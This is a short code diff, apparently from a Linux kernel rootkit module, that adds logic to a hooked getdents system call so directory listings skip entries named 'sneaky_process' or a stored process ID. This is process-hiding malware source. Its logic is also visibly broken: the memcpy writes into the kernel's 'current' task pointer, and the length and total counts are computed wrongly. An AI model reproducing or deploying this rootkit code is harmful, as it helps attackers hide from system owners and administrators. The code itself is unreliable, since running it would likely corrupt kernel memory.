@@ -81,8 +81,25 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
-
     int num = dirp->d_reclen;
+    struct linux_dirent * current_dir;
+    int current_position = 0;
+    int current_reclen,  length;
+
+    while(current_position < num){
+
+      current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
+      current_reclen = current_dir->d_reclen;
+
+      if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){
+
+	num = num - current_reclen;
+        length  = (size_t)(((char *)current_dir + current_reclen) - (char*)dirp);
+        memcpy(current, (char*)current_dir + current_reclen, length);
+      }
+      current_position = current_position + current_reclen;
+    }
+    
     return num;
     
 }
